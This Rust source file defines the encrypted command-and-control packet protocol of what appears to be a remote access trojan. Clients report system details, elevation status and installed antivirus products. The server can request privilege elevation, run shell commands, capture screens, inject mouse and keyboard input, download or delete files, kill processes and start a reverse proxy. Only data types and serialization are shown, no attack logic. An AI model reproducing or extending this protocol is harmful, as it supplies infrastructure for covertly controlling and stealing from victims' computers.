use rmp_serde::{Deserializer, Serializer};
use serde::{Deserialize, Serialize};

#[derive(Debug, PartialEq, Eq, Clone, Deserialize, Serialize)]
pub struct ClientInfo {
    pub group: String,
    pub username: String,
    pub hostname: String,
    pub os: String,
    pub ram: String,
    pub cpu: String,
    pub gpus: Vec<String>,
    pub storage: Vec<String>,
    pub displays: i32,
    pub is_elevated: bool,
    pub reverse_proxy_port: String,
}

pub trait Packet {
    fn serialized(&self) -> Vec<u8>;
    fn deserialized(buf: &[u8]) -> Result<(Self, &[u8]), rmp_serde::decode::Error>
    where
        Self: std::marker::Sized;
    fn get_type(&self) -> &'static str;
}

/// Packets going from client to the server.
#[derive(Debug, PartialEq, Eq, Serialize, Deserialize, Clone)]
pub enum ServerboundPacket {
    EncryptionRequest,
    EncryptionConfirm(Vec<u8>, Vec<u8>), // encrypted secret and token
    ClientInfo(ClientInfo),
    ScreenshotResult(Vec<u8>),
    RemoteDesktopFrame(RemoteDesktopFrame),
    ProcessList(ProcessList),
    ShellOutput(String),


    DonwloadFileResult(FileData),

    DisksResult(Vec<String>),
    FileList(Vec<File>),
    CurrentFolder(String),
    
    InstalledAVs(AVList),
}

impl Packet for ServerboundPacket {
    fn serialized(&self) -> Vec<u8> {
        let mut buf = Vec::new();
        self.serialize(&mut Serializer::new(&mut buf)).unwrap();
        buf
    }

    fn deserialized(buf: &[u8]) -> Result<(Self, &[u8]), rmp_serde::decode::Error> {
        let mut d = Deserializer::new(buf);
        Self::deserialize(&mut d).map(|p| (p, d.into_inner()))
    }

    fn get_type(&self) -> &'static str {
        match self {
            ServerboundPacket::EncryptionRequest => "EncryptionRequest",
            ServerboundPacket::EncryptionConfirm(_, _) => "EncryptionConfirm",
            ServerboundPacket::ClientInfo(_) => "ClientInfo",
            ServerboundPacket::ScreenshotResult(_) => "ScreenshotResult",
            ServerboundPacket::RemoteDesktopFrame(_) => "RemoteDesktopFrame",
            ServerboundPacket::ProcessList(_) => "ProcessList",
            ServerboundPacket::ShellOutput(_) => "ShellOutput",
            ServerboundPacket::DonwloadFileResult(_) => "DonwloadFileResult",
            ServerboundPacket::DisksResult(_) => "DisksResult",
            ServerboundPacket::FileList(_) => "FileList",
            ServerboundPacket::CurrentFolder(_) => "CurrentFolder",
            ServerboundPacket::InstalledAVs(_) => "InstalledAVs",
        }
    }
}

/// Packets going from the server to client.
#[derive(Debug, PartialEq, Eq, Serialize, Deserialize, Clone)]
pub enum ClientboundPacket {
    CloseClientSession,
    EncryptionResponse(Vec<u8>, Vec<u8>), // channel's public key and token
    EncryptionAck,
    InitClient,
    ScreenshotDisplay(String),
    Reconnect,
    Disconnect,
    StartRemoteDesktop(RemoteDesktopConfig),
    StopRemoteDesktop,
    MouseClick(MouseClickData),
    KeyboardInput(KeyboardInputData),
    VisitWebsite(VisitWebsiteData),
    ShowMessageBox(MessageBoxData),
    ElevateClient,
    ManageSystem(String),

    GetProcessList,
    KillProcess(Process),

    StartShell,
    ExitShell,
    ShellCommand(String),


    ViewDir(String),
    PreviousDir,
    RemoveDir(String),
    RemoveFile(String),
    DownloadFile(String),
    AvailableDisks,

    StartReverseProxy(String),
    StopReverseProxy,
    
    GetInstalledAVs,
}

impl Packet for ClientboundPacket {
    fn serialized(&self) -> Vec<u8> {
        let mut buf = Vec::new();
        self.serialize(&mut Serializer::new(&mut buf)).unwrap();
        buf
    }

    fn deserialized(buf: &[u8]) -> Result<(Self, &[u8]), rmp_serde::decode::Error> {
        let mut d = Deserializer::new(buf);
        Self::deserialize(&mut d).map(|p| (p, d.into_inner()))
    }

    fn get_type(&self) -> &'static str {
        match self {
            ClientboundPacket::CloseClientSession => "CloseClientSession",
            ClientboundPacket::EncryptionResponse(_, _) => "EncryptionResponse",
            ClientboundPacket::EncryptionAck => "EncryptionAck",
            ClientboundPacket::InitClient => "InitClient",
            ClientboundPacket::ScreenshotDisplay(_) => "ScreenshotDisplay",
            ClientboundPacket::Reconnect => "Reconnect",
            ClientboundPacket::Disconnect => "Disconnect",
            ClientboundPacket::StartRemoteDesktop(_) => "StartRemoteDesktop",
            ClientboundPacket::StopRemoteDesktop => "StopRemoteDesktop",
            ClientboundPacket::MouseClick(_) => "MouseClick",
            ClientboundPacket::KeyboardInput(_) => "KeyboardInput",
            ClientboundPacket::VisitWebsite(_) => "VisitWebsite",
            ClientboundPacket::ShowMessageBox(_) => "ShowMessageBox",
            ClientboundPacket::ElevateClient => "ElevateClient",
            ClientboundPacket::ManageSystem(_) => "ManageSystem",
            ClientboundPacket::GetProcessList => "GetProcessList",
            ClientboundPacket::KillProcess(_) => "KillProcess",
            ClientboundPacket::StartShell => "StartShell",
            ClientboundPacket::ExitShell => "ExitShell",
            ClientboundPacket::ShellCommand(_) => "ShellCommand",

            ClientboundPacket::ViewDir(_) => "ViewDir",
            ClientboundPacket::PreviousDir => "PreviousDir",
            ClientboundPacket::RemoveDir(_) => "Remove Dir",
            ClientboundPacket::RemoveFile(_) => "Remove File",
            ClientboundPacket::DownloadFile(_) => "Download File",
            ClientboundPacket::AvailableDisks => "Available Disks",

            ClientboundPacket::StartReverseProxy(_) => "Start Reverse Proxy",
            ClientboundPacket::StopReverseProxy => "Stop Reverse Proxy",
            ClientboundPacket::GetInstalledAVs => "Get Installed AVs",
        }
    }
}

#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
pub struct RemoteDesktopConfig {
    pub display: i32,
    pub quality: u8,   // JPEG compression quality (1-100)
    pub fps: u8,       // Target frames per second
}

#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
pub struct RemoteDesktopFrame {
    pub timestamp: u64,
    pub display: i32,
    pub data: Vec<u8>, // JPEG encoded image data
}

#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
pub struct MouseClickData {
    pub click_type: i32,  // 0 for left, 1 for middle, 2 for right, 3 for scroll
    pub display: i32,
    pub x: i32,
    pub y: i32,
    pub action_type: i32, // 0 for click (down+up), 1 for mouse down, 2 for mouse up, 3 for mouse move during drag, 4 for scroll up, 5 for scroll down
    pub scroll_amount: i32, // Amount to scroll (only used when click_type is 3)
}

#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
pub struct VisitWebsiteData {
    pub visit_type: String,
    pub url: String,
}

#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
pub struct MessageBoxData {
    pub title: String,
    pub message: String,
    pub button: String,
    pub icon: String,
}

#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
pub struct ProcessList {
    pub processes: Vec<Process>,
}

#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
pub struct Process {
    pub pid: usize,
    pub name: String,
}

#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
pub struct File {
    pub file_type: String,
    pub name: String,
}

#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
pub struct FileData {
    pub name: String,
    pub data: Vec<u8>,
}

#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
pub struct KeyboardInputData {
    pub key_code: u32,       // Virtual key code
    pub character: String,   // Printable character
    pub is_keydown: bool,    // True for key down, false for key up
    pub shift_pressed: bool, // Shift modifier state
    pub ctrl_pressed: bool,  // Ctrl modifier state
    pub caps_lock: bool,     // Caps lock state
}

#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
pub struct AVList {
    pub avs: Vec<String>,
}